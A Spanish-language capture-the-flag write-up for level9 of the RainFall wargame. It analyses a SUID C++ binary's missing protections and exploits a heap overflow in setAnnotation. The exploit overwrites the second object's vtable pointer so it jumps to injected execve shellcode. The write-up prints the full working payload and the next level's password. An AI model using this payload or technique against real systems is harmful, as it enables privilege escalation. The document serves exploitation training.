# 1. Buscar Binario:

Listamos los archivos para que muestre el binario del `level9` y sus permisos:
```bash
level9@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level9 level9   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level9 level9  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level9 level9 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 bonus0 users  6720 Mar  6  2016 level9
-rw-r--r--+ 1 level9 level9   65 Sep 23  2015 .pass
-rw-r--r--  1 level9 level9  675 Apr  3  2012 .profile
level9@RainFall:~$ 
```

> **Nota:** El bit `s` en los permisos indica que es un binairo **SUID**. Se ejecuta con los privilegios del propietario (`bonus0`).

---

# 2. Analizamos las protecciones de la RAM

### a). PIE;
```bash
level9@RainFall:~$ file ./level9 
./level9: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xdda359aa790074668598f47d1ee04164f5b63afa, not stripped
```

### b). ASLR:
```bash
level9@RainFall:~$ cat /proc/sys/kernel/randomize_va_space 
0
```

### c). NX y RELRO:
```bash
level9@RainFall:~$ readelf -l ./level9 | grep -E "STACK|RELRO"
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
```

### d). STACK CANARY:
```bash
level9@RainFall:~$ nm ./level9 
-bash: /usr/bin/nm: Input/output error
```

### e). `.got` y `.plt`:
```bash
level9@RainFall:~$ readelf -S ./level9 | grep -E ".got|.plt"
  [10] .rel.plt          REL             0804841c 00041c 000048 08   A  5  12  4
  [12] .plt              PROGBITS        080484a0 0004a0 0000a0 04  AX  0   0 16
  [23] .got              PROGBITS        08049b40 000b40 000004 04  WA  0   0  4
  [24] .got.plt          PROGBITS        08049b44 000b44 000030 04  WA  0   0  4
```
---

# 3. Resumen del análisis:

| Protección | Estado | Evidencia | Consecuencias |
| --- | --- | --- | --- |
| **PIE** | **OFF** | `executable` | El binario siempre carga en `0x08048000`. |
| **ASLR** | **OFF** | `0` | El Heap y el Stack no se mueven; las direcciones son fijas. |
| **NX** | **OFF** | `RWE` | El Heap es ejecutable. Podemos meter y correr Shellcode allí. |
| **RELRO** | **OFF** | `No RELRO` | La tabla GOT podría ser un objetivo, aunque aquí usamos Vtables. |

---

# 4. Fuzzing:

El binario espera un argumento. Si pasamos una cadena larga, el programa intenta acceder a una dirección de memoria inválida debido a un desbordamiento en el Heap, provocando un `Segmentation fault`.

```bash
level9@RainFall:~$ ./level9 $(python -c 'print "A"*200')
Segmentation fault (core dumped)

```

# 5. Reverse Engineering (Target Identification):

El programa está en C++. Al analizar el código con `gdb`, vemos que reserva dos objetos de una clase (clase `N`) usando `operator new`.

1. **Objeto 1 (Destino del desbordamiento):** Se encuentra en `0x0804a008`.
2. **Objeto 2 (El objetivo):** Se encuentra en `0x0804a078`.
3. **Vulnerabilidad:** La función `setAnnotation` usa `memcpy` sin control de tamaño, permitiendo que el Objeto 1 pise la **Vtable** (tabla de funciones virtuales) del Objeto 2.

Para ver con detalle el analisis consulta el archivo  [asm_analysis.md](https://github.com/4trastos/Rainfall/blob/main/level9/Resources/README.md) en conjunto con el programa de demostración  [source.c](https://github.com/4trastos/Rainfall/blob/main/level9/source.c).

---

# 6. Solución: Heap-based Buffer Overflow

1. **Identificamos el Mecanismo de Salto:**
En C++, para llamar a una función virtual, el programa hace un "doble salto":
* Lee la dirección de la Vtable desde el objeto (`vptr`).
* Lee la dirección de la función desde la Vtable.
* Salta a esa dirección: `call [ [vptr] ]`.


2. **Cálculo del Offset:**
La distancia entre objetos es `0x804a078 - 0x804a008 = 112 bytes`.
Como el buffer que escribimos empieza en el byte 4 del objeto, necesitamos **108 bytes** para llegar a pisar el puntero del segundo objeto.

3. **Construcción del Payload:**
* **Byte 0-3:** Ponemos una dirección que apunte 4 bytes más adelante (`0x0804a00c`). Esto servirá como nuestra "Fake Vtable".
* **Byte 4-27:** El Shellcode (las instrucciones para la shell).
* **Byte 28-111:** Basura (`A`) para rellenar hasta llegar al Objeto 2.
* **Byte 112-115:** La dirección del inicio del Objeto 1 (`0x0804a008`), que sobreescribirá el `vptr` del Objeto 2.

### **Ejecución:**

Usamos una cadena que coloca la dirección de salto al final y el shellcode al principio:

```bash
level9@RainFall:~$ ./level9 $(python -c 'print "\x0c\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 80 + "\x08\xa0\x04\x08"')
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
$ 
level9@RainFall:~$ su bonus0
Password: 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus0/bonus0
bonus0@RainFall:~$ 

```

# 7. Conclusión:

El ataque explota la gestión de memoria de C++ en el Heap. Al no tener **NX** ni **ASLR**, podemos inyectar un Shellcode en el primer objeto y engañar al segundo objeto para que use el inicio de nuestro buffer como si fuera su tabla de funciones virtuales. Al llamar a un método virtual, el programa salta a nuestro código malicioso con privilegios de `bonus0`.

